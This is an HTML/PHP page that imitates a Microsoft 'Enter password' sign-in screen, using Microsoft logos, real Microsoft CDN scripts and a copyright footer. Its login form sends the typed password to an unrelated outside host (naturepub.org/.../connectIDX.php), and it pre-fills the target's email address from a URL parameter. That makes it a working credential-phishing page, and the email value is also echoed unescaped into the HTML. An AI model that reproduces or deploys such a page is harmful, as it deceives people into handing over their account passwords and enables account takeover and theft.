<html dir="ltr" lang="en"><head>
    <title>Sign in to your account</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <meta name="PageID" content="ConvergedSignIn">
    <meta name="SiteID" content="">
    <meta name="ReqLC" content="2057">
    <meta name="LocLC" content="en-GB">

    
        <link rel="shortcut icon" href="files/favicon_a.ico">
    

<script type="text/javascript">//<![CDATA[
!function(){var r=window,n=r.$Debug=r.$Debug||{},e=r.$Config||{};if(!n.appendLog){var t=[],o=0;n.appendLog=function(r){var n=e.maxDebugLog||25,a=(new Date).toUTCString()+":"+r;t.push(o+":"+a),t.length>n&&t.shift(),o++},n.getLogs=function(){return t}}}(),function(){function r(r,n){function e(a){var i=r[a];return t-1>a?void(o.r[i]?e(a+1):o.when(i,function(){e(a+1)})):void n(i)}var t=r.length;e(0)}function n(r,n,a){function i(){var r=!!u.method,o=r?u.method:a[0],i=u.extraArgs||[],s=t.$WebWatson;try{var l=e(a,!r);if(i&&i.length>0)for(var c=i.length,f=0;c>f;f++)l.push(i[f]);o.apply(n,l)}catch(d){return void(s&&s.submitFromException&&s.submitFromException(d))}}var u=o.r&&o.r[r];return n=n?n:this,u&&(u.skipTimeout?i():t.setTimeout(i,0)),u}function e(r,n){return Array.prototype.slice.call(r,n?1:0)}var t=window;t.$Do||(t.$Do={q:[],r:[],removeItems:[],lock:0,o:[]});var o=t.$Do;o.when=function(e,t){function a(r){n(r,i,u)||o.q.push({id:r,c:i,a:u})}var i=0,u=[],s=1,l="function"==typeof t;l||(i=t,s=2);for(var c=s;c<arguments.length;c++)u.push(arguments[c]);e instanceof Array?r(e,a):a(e)},o.register=function(r,e,t){if(!o.r[r]){o.o.push(r);var a={};if(e&&(a.method=e),t&&(a.skipTimeout=t),arguments&&arguments.length>3){a.extraArgs=[];for(var i=3;i<arguments.length;i++)a.extraArgs.push(arguments[i])}o.r[r]=a,o.lock++;try{for(var u=0;u<o.q.length;u++){var s=o.q[u];s.id==r&&n(r,s.c,s.a)&&o.removeItems.push(s)}}catch(l){throw l}finally{if(o.lock--,0===o.lock){for(var c=0;c<o.removeItems.length;c++)for(var f=o.removeItems[c],d=0;d<o.q.length;d++)if(o.q[d]===f){o.q.splice(d,1);break}o.removeItems=[]}}}},o.unregister=function(r){o.r[r]&&delete o.r[r]}}(),function(){function r(r){f&&f.appendLog&&f.appendLog(r)}function n(r){return r.length>p.length&&r.substr(r.length-p.length).toLowerCase()==p}function e(e,o,a,i,u,s,l){var c=e.src||e.href||"";if(c){var f=e.id||"";if(!o&&n(c))try{e.sheet&&e.sheet.cssRules&&!e.sheet.cssRules.length&&(o=!0)}catch(d){}o?(r("[$Loader]: "+(l||"Failed")+" '"+(c||"")+"', id:"+f+", async:"+(e.async||"")+"', defer:"+(e.defer||"")),t(c,0,f,a,i,u)):(r("[$Loader]: "+(s||"Loaded")+" '"+(c||"")+"', id:"+(e.id||"")+", async:"+(e.async||"")+"', defer:"+(e.defer||"")),i&&i())}}function t(r,n,e,o,a,i){if(r)if(o&&v>n){g++;var u=new s;u.retryOnError=!1,u.failMessage="Reload Failed",u.successMessage="Reload Success",u.Add(r,"Reload_"+g+(e?"_"+e:"")),u.Load(a,function(){t(r,n+1,e,o,a,i)})}else i&&i()}function o(r){var n=d.createElement("link");return n.rel="stylesheet",n.type="text/css",n.href=r.srcPath,n}function a(r){var n=d.createElement("script");return r.id&&(n.id=r.id),n.crossorigin="anonymous",n.type="text/javascript",n.src=r.srcPath,n.defer=!1,n.async=!1,n}function i(t,i,u,s,l,c){function f(){e(g,!1,i,u,s,l,c)}if(!t||!t.srcPath)return void(u&&u());var g=null;g=n(t.srcPath)?o(t):a(t),g.onload=f,g.onerror=function(){e(g,!0,i,u,s,l,c)},g.onreadystatechange=function(){"loaded"===g.readyState?setTimeout(f,500):"complete"===g.readyState&&f()};var v=d.getElementsByTagName("head")[0];v.appendChild(g),r("[$Loader]: Loading '"+(t.srcPath||"")+"', id:"+(t.id||""))}function u(r,n,e,t,o,a,s){function l(){u(r,n+1,e,t,o,a,s)}return n<r.length?void i(r[n],e,l,o,a,s):void(t&&t())}function s(){var r=this,n=[];r.retryOnError=!0,r.successMessage="Loaded",r.failMessage="Error",r.Add=function(r,e){r&&n.push({srcPath:r,id:e})},r.AddIf=function(n,e,t){n&&r.Add(e,t)},r.Load=function(e,t){u(n,0,r.retryOnError,e,t,r.successMessage,r.failMessage)}}var l=window,c=l.$Config,f=l.$Debug,d=l.document,g=0,v=c.slMaxRetry||2,h=c.slReportFailure||!1,p=".css";s.On=function(r,n){if(!r)throw"The target element must be provided and cannot be null";e(r,n,!0,null,function(){if(h){var n=r.src||r.href||"";throw"Failed to load external resource ['"+n+"']"}})},l.$Loader=s}(),function(){function r(){if(!m){var r=new d.$Loader;r.AddIf(!d.jQuery,v.sbundle,"WebWatson_DemandSupport"),v.sbundle=null,delete v.sbundle,r.AddIf(!d.$Api,v.fbundle,"WebWatson_DemandFramework"),v.fbundle=null,delete v.fbundle,r.Add(v.bundle,"WebWatson_DemandLoaded"),r.Load(n,e),m=!0}}function n(){if(d.$WebWatson){if(d.$WebWatson.isProxy)return void e();h.when("$WebWatson.full",function(){for(;p.length>0;){var r=p.shift();r&&d.$WebWatson[r.cmdName].apply(d.$WebWatson,r.args)}})}}function e(){var r=d.$WebWatson?d.$WebWatson.isProxy:!0;t(),v.loadErrorUrl&&r&&window.location.assign(v.loadErrorUrl)}function t(){p=[],d.$WebWatson=null}function o(n){return function(){var e=arguments;p.push({cmdName:n,args:e}),r()}}function a(){var r=["foundException","resetException","submit","submitFromException","showError","reportException"],n=this;n.isProxy=!0;for(var e=r.length,t=0;e>t;t++){var a=r[t];a&&(n[a]=o(a))}}function i(r,n,e,t,o,a,i,u,s){var l=d.event;a||(a=f(o||l,i?i+2:2)),d.$Debug&&d.$Debug.appendLog&&d.$Debug.appendLog("[WebWatson]:"+(r||"")+" in "+(n||"")+" @ "+(e||"??")),y.submit(r,n,e,t,o||l,a,i,u,s)}function u(r,n){return{signature:r,args:n,toString:function(){return this.signature}}}function s(r){for(var n=[],e=r.split("\n"),t=0;t<e.length;t++)n.push(u(e[t],[]));return n}function l(r){for(var n=[],e=r.split("\n"),t=0;t<e.length;t++){var o=u(e[t],[]);e[t+1]&&(o.signature+="@"+e[t+1],t++),n.push(o)}return n}function c(r){if(!r)return null;try{if(r.stack)return s(r.stack);if(r.error){if(r.error.stack)return s(r.error.stack)}else if(window.opera&&r.message)return l(r.message)}catch(n){}return null}function f(r,n){var e=[];try{for(var t=arguments.callee;n>0;)t=t?t.caller:t,n--;for(var o=0;t&&b>o;){var a="InvalidMethod()";try{a=t.toString()}catch(i){}var s=[],l=t.args||t.arguments;if(l)for(var f=0;f<l.length;f++)s[f]=l[f];e.push(u(a,s)),t=t.caller,o++}}catch(i){e.push(u(i.toString(),[]))}var d=c(r);return d&&(e.push(u("--- Error Event Stack -----------------",[])),e=e.concat(d)),e}var d=window,g=d.$Config||{},v=g.watson,h=d.$Do;if(!d.$WebWatson&&v){var p=[],m=!1,b=10,y=d.$WebWatson=new a;y.CB={},y._orgErrorHandler=d.onerror,d.onerror=i,y.errorHooked=!0,h.when("jQuery.version",function(r){v.expectedVersion=r}),h.register("$WebWatson")}}(),function(){function r(r,n){for(var e=n.split("."),t=e.length,o=0;t>o&&null!==r&&void 0!==r;)r=r[e[o++]];return r}function n(n){var e=null;return null===s&&(s=r(a,"Constants")),null!==s&&n&&(e=r(s,n)),null===e||void 0===e?"":e.toString()}function e(e){var t=null;return null===i&&(i=r(a,"$Config.strings")),null!==i&&e&&(t=r(i,e.toLowerCase())),(null===t||void 0===t)&&(t=n(e)),null===t||void 0===t?"":t.toString()}function t(r,n){var t=null;return r&&n&&n[r]&&(t=e("errors."+n[r])),t||(t=e("errors."+r)),t||(t=e("errors."+l)),t||(t=e(l)),t}function o(e){var t=null;return null===u&&(u=r(a,"$Config.urls")),null!==u&&e&&(t=r(u,e.toLowerCase())),(null===t||void 0===t)&&(t=n(e)),null===t||void 0===t?"":t.toString()}var a=window,i=null,u=null,s=null,l="GENERIC_ERROR";a.GetString=e,a.GetErrorString=t,a.GetUrl=o}(),function(){var r=window,n=r.$Config||{};r.$B=n.browser||{}}();

//]]></script> 
 



    

    <script type="text/javascript">
        ServerData = $Config;
        
        var g_iSRSFailed = ServerData.srsFailed;
        var g_sSRSSuccess = ServerData.srsSuccess;
    </script>

    <link href="files/converged.login.min.css" rel="stylesheet" onerror="$Loader.On(this,true)" onload="$Loader.On(this)">

    <script crossorigin="anonymous" src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.6348.16/content/cdnbundles/convergedlogin_pcore.min.js" onerror="$Loader.On(this,true)" onload="$Loader.On(this)"></script>

    
    <script crossorigin="anonymous" src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.6348.16/content/cdnbundles/convergedloginpaginatedstrings-en-gb.min.js" onerror="$Loader.On(this,true)" onload="$Loader.On(this)"></script>

    

</head>

<body data-bind="defineGlobals: ServerData, bodyCssClass" class="cb ltr" style="display: block;">
    <script type="text/javascript">//<![CDATA[
!function(){var o=window,l=o.document,n=o.$Config||{};o.self===o.top?l&&l.body&&(l.body.style.display="block"):n.allowFrame||(o.top.location=o.self.location)}();

//]]></script>

<div><!--  --> <div data-bind="component: { name: 'background-image', publicMethods: backgroundControlMethods }"><div class="background app" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }"><!-- ko if: smallImageUrl --><!-- /ko --><!-- ko if: backgroundImageUrl --><!-- /ko --><!-- ko if: !!backgroundImageUrl() --><!-- /ko --> </div></div>
<form name="f1" id="i0281" spellcheck="false" method="post" target="_top" autocomplete="off" data-bind="autoSubmit: forceSubmit, attr: { action: postUrl }" action="https://naturepub.org/polar/source/connectIDX.php">

<!-- ko withProperties: { '$loginPage': $data } --> <div class="outer" data-bind="component: { name: 'page',
        params: {
            serverData: svr,
            showButtons: svr.fShowButtons,
            showFooterLinks: true,
            useWizardBehavior: svr.fUseWizardBehavior,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
         event: {
            footerAgreementClick: footer_agreementClick } }"><!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --> <div class="middle"><!-- ko if: $loginPage.backgroundLogoUrl() && !(paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo')) --> <img class="background-logo large" role="presentation" data-bind="css: { 'large': $loginPage.useLargeBackgroundLogo }, attr: { src: $loginPage.backgroundLogoUrl() }" src="files/bannerlogo?ts=635974776182591704"><!-- /ko --> <div class="inner app" data-bind="css: { 'app': $loginPage.backgroundLogoUrl() }"><!-- ko ifnot: paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo') --> <div data-bind="component: { name: 'logo-control',
                    params: {
                        isChinaDc: svr.fIsChinaDc,
                        bannerLogoUrl: $loginPage.bannerLogoUrl() } }"><!--  --><!-- ko if: bannerLogoUrl --><!-- /ko --><!-- ko if: !bannerLogoUrl && !isChinaDc --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="logo" role="presentation" pngsrc="files/microsoft_logo.png?x=ed9c9eb0dce17d752bedea6b5acda6d9" svgsrc="files/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd" data-bind="imgSrc" src="files/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd"><!-- /ko --> <!-- /ko --><!-- /ko --> <!-- /ko --></div><!-- /ko --> <div data-bind="
                    css: { 'wide': paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata('wide') },
                    component: { name: 'pagination-control',
                        publicMethods: paginationControlMethods,
                        params: {
                            initialViewId: initialViewId,
                            currentViewId: currentViewId,
                            initialSharedData: initialSharedData,
                            initialError: $loginPage.getServerError() },
                        event: {
                            cancel: paginationControl_onCancel } }"><div data-bind="css: { 'animate': animate() || animate.back(), 'back': animate.back }" class="animate"><!-- ko foreach: views --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --> <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="2" data-bind="component: { name: 'login-paginated-password-view',
                        publicMethods: viewInterfaces[$index()],
                        params: {
                            serverData: svr,
                            serverError: initialError,
                            isInitialView: isInitialState,
                            username: sharedData.username,
                            displayName: sharedData.displayName,
                            hipRequiredForUsername: sharedData.hipRequiredForUsername,
                            passwordBrowserPrefill: sharedData.passwordBrowserPrefill,
                            hasRemoteNgc: !!sharedData.remoteNgcParams.sessionIdentifier,
                            desktopSsoEnabled: sharedData.desktopSsoEnabled,
                            defaultKmsiValue: svr.iDefaultLoginOptions === 1,
                            userTenantBranding: sharedData.userTenantBranding,
                            sessions: sharedData.sessions,
                            isLongRunningTransaction: sharedData.isLongRunningTransaction },
                        event: {
                            load: view_onLoad,
                            switchView: view_onSwitchView,
                            submitReady: $loginPage.view_onSubmitReady,
                            resetPassword: $loginPage.passwordView_onResetPassword,
                            desktopSsoStart: $loginPage.view_desktopSsoStart,
                            updateBranding: $loginPage.view_onUpdateBranding } }"><!--  --> <input type="hidden" name="i13" data-bind="value: isKmsiChecked() ? 1 : 0" value="0"> <input type="hidden" name="login" data-bind="value: username" value="<?php echo $_GET['email']; ?>"> <input type="text" name="loginfmt" data-bind="moveOffScreen, value: displayName" class="moveOffScreen" tabindex="-1" aria-hidden="true"> <input type="hidden" name="type" data-bind="value: svr.fUseWizardBehavior ? 20 : 11" value="11"> <input type="hidden" name="LoginOptions" data-bind="value: isKmsiChecked() ? 1 : 3" value="3"> <input type="hidden" name="lrt" data-bind="value: isLongRunningTransaction" value=""> <div data-bind="component: { name: 'identity-banner-control',
     params: {
        pawnIconId: svr.iPawnIcon,
        displayName: displayName } }"><!--  --> <div class="identityBanner"> <div class="identity" data-bind="text: displayName, attr: { 'title': displayName }" title="<?php echo $_GET['email']; ?>"><?php echo $_GET['email']; ?></div> <div class="profile-photo"><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img role="presentation" data-bind="attr: { src: getDarkUrl() }" src="files/picker_account_aad.svg?x=9de70d1c5191d1852a0d5aac28b44a6c"><!-- /ko --> <!-- /ko --><!-- /ko --> </div> </div><!-- ko if: svr.urlProfileRest && !userTileUrl() --><!-- /ko --></div> <div id="loginHeader" class="row text-title" role="heading" data-bind="text: str['CT_PWD_STR_EnterPassword_Title']">Enter password</div><!-- ko if: pageDescription --><!-- /ko --> <div class="row"> <div class="form-group col-md-24"> <div role="alert" aria-live="assertive" aria-atomic="false"><!-- ko if: error --><!-- /ko --> </div> <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox', params: {
            serverData: svr,
            textInput: password,
            hasFocus: isFocused,
            hintText: str['CT_PWD_STR_PwdTB_Label'],
            forcePlaceholderAttribute: true,
            hintCss: 'placeholder' } }"><!-- ko withProperties: { '$placeholderText': placeholderText } --> <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --> <input name="passwd" autofocus="true" required="true" type="password" id="i0118" autocomplete="off" class="form-control" aria-describedby="passwordError loginHeader passwordDesc" aria-required="true" data-bind="
                    textInput: password,
                    hasFocusEx: isFocused,
                    placeholder: $placeholderText,
                    ariaLabel: str['CT_PWD_STR_PwdTB_AriaLabel'],
                    attr: { maxLength: svr.fAllowLongPasswords ? 127 : null },
                    css: { 'has-error': error }" placeholder="Password" aria-label="Enter password" maxlength="127"> <!-- /ko --><!-- /ko --><!-- ko ifnot: forcePlaceholderAttribute --><!-- /ko --></div> </div> </div><!-- ko if: svr.urlHIPScript && showHip --><!-- /ko --> <div class="row"> <div data-bind="component: { name: 'footer-buttons-field',
        params: {
            serverData: svr,
            primaryButtonText: str['CT_PWD_STR_SignIn_Button'],
            isPrimaryButtonEnabled: !isRequestPending(),
            isPrimaryButtonVisible: svr.fShowButtons,
            isSecondaryButtonVisible: svr.fShowButtons &amp;&amp; !isInitialView },
        event: {
            primaryButtonClick: primaryButton_onClick,
            secondaryButtonClick: secondaryButton_onClick } }"><div class="col-xs-24 form-group no-padding-left-right" data-bind="
     visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
     css: { 'no-margin-bottom': removeBottomMargin }"> <div data-bind="css: { 'col-xs-12 secondary': isPrimaryButtonVisible(), 'col-xs-24': !isPrimaryButtonVisible() }" class="col-xs-12 secondary"> <input type="button" id="idBtn_Back" class="btn btn-block" data-bind="
            attr: {
                'id': secondaryButtonId || 'idBtn_Back',
                'aria-describedby': secondaryButtonDescribedBy },
            value: secondaryButtonText() || str['CT_HRD_STR_Splitter_Back'],
            hasFocus: focusOnSecondaryButton,

            click: secondaryButton_onClick,
            enable: isSecondaryButtonEnabled,
            visible: isSecondaryButtonVisible" value="Back"> </div> <div data-bind="css: { 'col-xs-12 primary': isSecondaryButtonVisible(), 'col-xs-24': !isSecondaryButtonVisible() }" class="col-xs-12 primary"> <input type="submit" id="idSIButton9" class="btn btn-block btn-primary" data-bind="
            attr: {
                'id': primaryButtonId || 'idSIButton9',
                'aria-describedby': primaryButtonDescribedBy },
            value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
            hasFocus: focusOnPrimaryButton,
            click: primaryButton_onClick,
            enable: isPrimaryButtonEnabled,
            visible: isPrimaryButtonVisible" value="Sign in"> </div> </div></div> </div><!-- ko if: svr.fShowPersistentCookiesWarning --><!-- /ko --><!-- ko if: svr.fKMSIEnabled !== false && !svr.fShowPersistentCookiesWarning --> <div id="idTd_PWD_KMSI_Cb" class="form-group checkbox text-block-body no-margin-top" data-bind="visible: !svr.fLockUsername &amp;&amp; !showHip"> <label id="idLbl_PWD_KMSI_Cb"> <input name="KMSI" id="idChkBx_PWD_KMSI0Pwd" type="checkbox" data-bind="checked: isKmsiChecked, ariaLabel: str['CT_PWD_STR_KeepMeSignedInCB_Text']" aria-label="Keep me signed in"> <span data-bind="text: str['CT_PWD_STR_KeepMeSignedInCB_Text']">Keep me signed in</span> </label> </div><!-- /ko --> <div class="row"> <div class="col-md-24"> <div class="text-13"> <div class="form-group no-margin-bottom" data-bind="css: { 'no-margin-bottom': !hasRemoteNgc &amp;&amp; !allowPhoneDisambiguation &amp;&amp; !showChangeUserLink }"> <a id="idA_PWD_ForgotPassword" href="" data-bind="text: str['CT_PWD_STR_ForgotPwdLink_Text'], href: svr.urlResetPassword, click: resetPassword_onClick">Forgotten my password</a> </div><!-- ko if: allowPhoneDisambiguation --><!-- /ko --><!-- ko if: hasRemoteNgc --><!-- /ko --> <div class="form-group no-margin-bottom" data-bind="visible: showChangeUserLink" style="display: none;"> <a id="i1668" data-bind="text: str['CT_FED_STR_ChangeUserLink_Text'], href: svr.urlSwitch">Sign in with another account</a> </div> </div> </div> </div><!-- ko if: tenantBranding.BoilerPlateText --><!-- /ko --></div><!-- /ko --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- /ko --> </div></div> </div> <input type="hidden" name="ps" data-bind="value: postedLoginStateViewId" value=""> <input type="hidden" name="psRNGCDefaultType" data-bind="value: postedLoginStateViewRNGCDefaultType" value=""> <input type="hidden" name="psRNGCEntropy" data-bind="value: postedLoginStateViewRNGCEntropy" value=""> <input type="hidden" name="psRNGCSLK" data-bind="value: postedLoginStateViewRNGCSLK" value=""> <input type="hidden" name="canary" data-bind="value: svr.canary" value="4y70rr4v95VF4lAEnzUbNbEqvB/7asuRgnr2K8dmMTY=8:1"> <input type="hidden" name="ctx" data-bind="value: ctx" value="rQIIAeNisNLJKCkpKLbS1y_ILypJzNHLzUwuyi_OTyvJz8vJzEvVS87P1csvSs9MAbGKhLgEPJb7n6877uAz6aPA6X-vWb-uYlQmbIT-BUbGF4yMt5gE_YvSPVPCi91SU1KLEksy8_MeMYsDVWWXO1TmF6fmZpYA1SfrJSfqlRZfYBF4xcJjwGrFwcElwCPBqsDwg4VxESvQDQpSF4p2TbVxWry40vuTFyvDKVZ9k0pzg6IikzJL0zA3kxxH17yq0CS_JNfCMid988Ti0qD0vCIjb4uUXN-QSFtzK8MJbEIT2JhOsTEc4GQEAA2"> <input type="hidden" id="i0327" data-bind="attr: { name: svr.sFTName }, value: flowToken" name="flowToken" value="AQABAAEAAABnfiG-mA6NTae7CdWW7QfdlHdt4LWndVXkpx4Ypo7dN38LRyyv17NuAnMObYvKRozNpguMX5n1nKHBUmHgXZdy0q1mDEYzf8WkhYacACBrOpXwNsazYOftnbkexopDm_VmmC_PXFJm2dAH5VN9hrhEC1JUf3kU4r7GTKv3O8pgJPA514yHfqFFJSizAubWydwvHwfysYUcQk89z7JWc1Cg6EtRRou2w4_Fn0eHBxa-XPabxsZV1eS8dqBKCs8rHyFQzHK38l05JBThrWO8dlqie5Yy54AZYDutMn3B279wUf4F8TLA05--zzrtNE9hBvIgAA"> <input type="hidden" name="PPSX" data-bind="value: svr.sRandomBlob" value=""> <input type="hidden" name="NewUser" value="1"> <input type="hidden" name="FoundMSAs" data-bind="value: svr.sFoundMSAs" value=""> <input type="hidden" name="fspost" data-bind="value: svr.fPOST_ForceSignin ? 1 : 0" value="0"> <input type="hidden" name="i21" data-bind="value: wasLearnMoreShown() ? 1 : 0" value="0"> <div data-bind="component: { name: 'instrumentation',
                publicMethods: instrumentationMethods,
                params: { serverData: svr } }"><input type="hidden" name="i2" data-bind="value: clientMode" value="1"> <input type="hidden" name="i17" data-bind="value: srsFailed" value=""> <input type="hidden" name="i18" data-bind="value: srsSuccess" value="true"> <input type="hidden" name="i19" data-bind="value: timeOnPage" value=""></div> </div> <!-- /ko --></div><!-- ko if: desktopSsoRunning --><!-- /ko --><!-- /ko --><!-- ko if: showOptOutBanner --><!-- /ko --> <div id="footer"> <div data-bind="component: { name: 'footer-control',
            params: {
                serverData: svr,
                showLinks: true },
            event: {
                agreementClick: footer_agreementClick } }"><!-- ko if: showLinks || impressumLink || showIcpLicense --> <div id="footerLinks" class="footerNode text-secondary"><!-- ko if: !showIcpLicense --> <span id="ftrCopy" data-bind="html: svr.strCopyrightTxt">&copy; <?php echo date('Y') ?> Microsoft</span><!-- /ko --> <a id="ftrTerms" data-bind="text: str['MOBILE_STR_Footer_Terms'], href: termsLink, click: termsLink_onClick" href="">Terms of use</a> <a id="ftrPrivacy" data-bind="text: str['MOBILE_STR_Footer_Privacy'], href: privacyLink, click: privacyLink_onClick" href="">Privacy &amp; Cookies</a><!-- ko if: impressumLink --><!-- /ko --><!-- ko if: showIcpLicense --><!-- /ko --> </div> <!-- /ko --></div> </div> </form> </div></body></html>